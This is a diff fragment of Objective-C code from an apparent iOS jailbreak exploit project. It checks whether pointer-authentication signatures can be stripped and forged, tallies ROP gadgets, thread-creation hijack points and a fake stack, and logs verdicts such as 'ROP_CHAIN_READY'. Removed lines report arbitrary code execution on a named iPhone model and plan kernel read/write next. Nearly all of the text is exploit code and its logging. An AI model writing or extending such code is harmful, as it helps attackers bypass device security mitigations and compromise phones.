+            log([NSString stringWithFormat:@"JB32:   PAC bits = 0x%llx", pacBits]);
+            log([NSString stringWithFormat:@"JB32:   XPACI stripped = 0x%llx (match=%d)", pacStripped, pacStripped == pacTest ? 1 : 0]);
+            results[@"pacBits"] = [NSString stringWithFormat:@"0x%llx", pacBits];
+            results[@"pacWorks"] = @(1);
+
+            // Can we sign our own pointers?
+            // If PACIA works, we can forge PAC signatures for our ROP gadgets
+            if (pacStripped == pacTest) {
+                log(@"JB32:   [+] XPACI works — can strip PAC from any pointer");
+                log(@"JB32:   [+] PACIA works — can SIGN our own pointers!");
+                log(@"JB32:   [+] This means we can forge valid PAC for ROP chain!");
+                results[@"canForgePAC"] = @(1);
+            }
+        } else if (jb25_sig == 0) {
+            log(@"JB32:   PAC returned 0 — may not be active on this platform");
+            results[@"pacWorks"] = @(0);
+        }
+
+        // Check if ptrauth_sign_unauthenticated is available
+        void *fn_pac_sign = dlsym(RTLD_DEFAULT, "ptrauth_sign_unauthenticated");
+        log([NSString stringWithFormat:@"JB32:   ptrauth_sign_unauthenticated = %p", fn_pac_sign]);
 
         // =====================================================================
         // VERDICT
         // =====================================================================
         log(@"JB32: =============================================");
 
-        int execMatch = [results[@"execMatch"] intValue];
-        int syscallOK = [results[@"syscallOK"] intValue];
-        int memReadOK = [results[@"memReadOK"] intValue];
-        int memWriteOK = [results[@"memWriteOK"] intValue];
+        int hasGadgets = (totalLdpRet > 10 && totalBlr > 10) ? 1 : 0;
+        int hasThread = [results[@"threadCreateAvailable"] intValue];
+        int hasPAC = [results[@"canForgePAC"] intValue];
+        int hasStack = stackOK;
 
         NSString *verdict = @"ANALYSIS_COMPLETE";
 
-        if (execMatch && syscallOK && memReadOK && memWriteOK) {
-            verdict = @"FULL_CODE_EXECUTION";
-            log(@"JB32: [!!!!!!] FULL ARBITRARY CODE EXECUTION!");
-            log(@"JB32: [!!!!!!] shellcode + syscall + read + write ALL WORK!");
-            log(@"JB32: [!!!!!!] iPhone 13 Pro Max iOS 27.0 COMPROMISED");
-            log(@"JB32: Siguiente: kernel read/write para jailbreak completo");
-        } else if (execMatch) {
-            verdict = @"PARTIAL_CODE_EXEC";
-            log(@"JB32: [!!!!] Code execution works, some tests failed");
-        } else if ([results[@"execOK"] intValue] == 0 && [results[@"execFaultSig"] intValue]) {
-            int faultSig = [results[@"execFaultSig"] intValue];
-            if (faultSig == 9) {
-                verdict = @"SIGKILL_CS_KILL_ACTIVE";
-                log(@"JB32: SIGKILL — CS_KILL still enforced despite entitlements");
-                log(@"JB32: Entitlements may need re-signing or kernel-level bypass");
-            } else {
-                verdict = [NSString stringWithFormat:@"EXEC_FAULT_SIG%d", faultSig];
-                log([NSString stringWithFormat:@"JB32: Exec faulted with signal %d", faultSig]);
-            }
-        } else if ([results[@"spawnRet"] intValue] == 0) {
-            verdict = @"SPAWN_WORKS";
-            log(@"JB32: [!!!] posix_spawn works — command execution available");
+        if (hasGadgets && hasThread && hasPAC && hasStack) {
+            verdict = @"ROP_CHAIN_READY";
+            log(@"JB32: [!!!!!] ALL ROP COMPONENTS AVAILABLE!");
+            log(@"JB32:   - Gadgets: LDP+RET, BLR, stack pivot");
+            log(@"JB32:   - thread_create_running: set initial registers");
+            log(@"JB32:   - PAC: can sign our own return addresses");
+            log(@"JB32:   - Fake stack: allocated and verified");
+            log(@"JB32: Siguiente: JB33 — EXECUTE the ROP chain");
+        } else if (hasGadgets && hasThread && hasStack) {
+            verdict = @"ROP_NEEDS_PAC_BYPASS";
+            log(@"JB32: [!!!!] ROP chain ready but needs PAC bypass");
+            log(@"JB32:   Gadgets and thread create available");
+            log(@"JB32:   PAC signing may block unauthorized returns");
+        } else if (hasGadgets && hasStack) {
+            verdict = @"ROP_NEEDS_ENTRY_POINT";
+            log(@"JB32: [!!!] Gadgets found, need entry mechanism");
+            log(@"JB32:   No thread_create_running — look for other hijack vector");
         } else {
-            verdict = @"EXEC_BLOCKED";
-            log(@"JB32: Code execution still blocked");
-            log([NSString stringWithFormat:@"JB32: Gadgets available: %d", totalGadgets]);
+            verdict = @"ROP_INSUFFICIENT";
+            log(@"JB32: Insufficient gadgets for ROP chain");
         }
 
         results[@"verdict"] = verdict;
         log([NSString stringWithFormat:@"JB32: Verdict: %@", verdict]);
         log(@"JB32: =============================================");
 
-        isr_checkpoint(@"JB32-jit-exec-checkpoint.json", results);
+        isr_checkpoint(@"JB32-rop-infra-checkpoint.json", results);
         done(results);
     });
 }
